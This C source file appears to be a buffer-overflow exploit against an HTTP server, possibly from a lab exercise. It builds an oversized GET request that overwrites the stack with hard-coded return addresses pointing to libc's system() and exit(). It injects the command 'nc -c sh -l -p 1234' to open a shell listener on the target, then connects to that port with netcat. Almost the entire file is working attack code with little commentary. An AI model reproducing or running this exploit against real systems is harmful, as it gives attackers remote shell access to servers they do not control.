#define _GNU_SOURCE 1
#define _XOPEN_SOURCE 700
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

static int connect_to(const char *hostname, const char *port)
{
	struct addrinfo hints;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = PF_INET;
	hints.ai_socktype = SOCK_STREAM;

	struct addrinfo *start;
	int ret = getaddrinfo(hostname, port, &hints, &start);
	if (ret != 0)
		return -1;
	int sock = -1;
	for (struct addrinfo *info = start; info; info = info->ai_next)
	{
		sock = socket(info->ai_family, info->ai_socktype,
			      info->ai_protocol);
		if (sock == -1)
			continue;

		if (connect(sock, info->ai_addr, info->ai_addrlen) != -1)
			break;
		close(sock);
		sock = -1;
	}
	freeaddrinfo(start);
	return sock;
}

/* This sends len bytes of data over the socket. It will call send(2)
 * over and over until one of the following happens:
 * - All of the data has been sent in which case it returns len;
 * - An error occurs in which case it returns -1; or
 * - The socket is closed in which case it returns the amount sent.
 * This does _not_ work with nonblocking sockets. */
static ssize_t sendn(int sock, const void *data, size_t len)
{
	ssize_t total = 0;
	while (len)

	{
		ssize_t amount = send(sock, data, len, 0);
		if (amount == -1 && errno == EINTR)
			continue;
		if (amount == -1)
			return -1;
		if (amount == 0)
			break;
		data += amount;
		len -= amount;
		total += amount;
	}
	return total;
}

static void recv_response(int sock)
{
	char buf[4096];

	while (1)
	{
		ssize_t amount = recv(sock, buf, sizeof buf, 0);
		if (amount == -1 && errno == EINTR)
			continue;
		if (amount <= 0)
			return;
		write(fileno(stdout), buf, amount);
	}
}
	//least to smash
	//char *http = "HTTP/1.2222222222222222222222222222222222222222222222222222222222222222222222222222222222";
int main(int argc, char *argv[])
{

	if (argc != 4)
	{
		fprintf(stderr, "Usage: %s hostname port file\n", argv[0]);
		return EXIT_FAILURE;
	}
	int sock = connect_to(argv[1], argv[2]);
	assert(sock != -1);

	char* makeItToZero = "\xdf\x34\xff\xbf"; //0xbfffe4df

	char *request;
	char get[1000] = "GET %s ";
	char *http = "HTTP/1.222222222222222222222222222222222222222222222222222222222222222222222222222222222123456789012345";
	//char *savedEbp = "\xd8\xf6\xff\xbf";
	//char *savedEbp = "\x8\xf6\xff\xbf";
	char *savedEbp = "\x98\xe4\xff\xbf";
	char *systemAddr = "\xb0\xe1\xec\xb7";
	//char *systemAddr = "\x34\x83\x04\x08"; //0x8048334

//	char *systemAddr = "\x60\x92\x04\x08"; //0x08049260  static 
	char *pad = "xxxxxxxx";
	char *exitAddr = "\x20\x43\xec\xb7";
	char *ptrToCMD = "\x4c\xe8\xff\xbf";
	char *validPtr = "\xa4\xe4\xff\xbf"; char* validPtr2 = "\x78\xe4\xff\xbf";
                                                                
	char *CMD = "                                            \
                                                                \
                                                                \
                                                   nc -c sh -l -p 1234 ;\n";
// http | validPtr| validPtr | validPtr | savedEbp | systemAddr | pad(8) | ptrToCMD | ptrToCMD | validPtr2 | CMD
	//							
	//char *exitAddr = "\xec\xb7\x04\x08";
	char *clientInfo = "\r\nHost: %s\r\n\r\n";
	printf("%d\n", strlen(http)+18);
	strcat(get, http);
	strcat(get, validPtr);
	strcat(get, validPtr);
	strcat(get, validPtr);
	strcat(get, savedEbp);
	strcat(get, systemAddr);

	//strcat(get, pad);
	//strcat(get, ptrToCMD);
	strcat(get, ptrToCMD);

	strcat(get, ptrToCMD);
	strcat(get, validPtr);
	strcat(get, validPtr2);
	strcat(get, CMD);
	strcat(get, clientInfo);
	asprintf(&request, get , argv[3], argv[1]);
	sendn(sock, request, strlen(request));
	free(request);
	//recv_response(sock);
	//close(sock);

	sleep(1);
	execl("/bin/nc", "nc", "localhost", "1234", NULL);
	_exit(1);
	return 0;
}
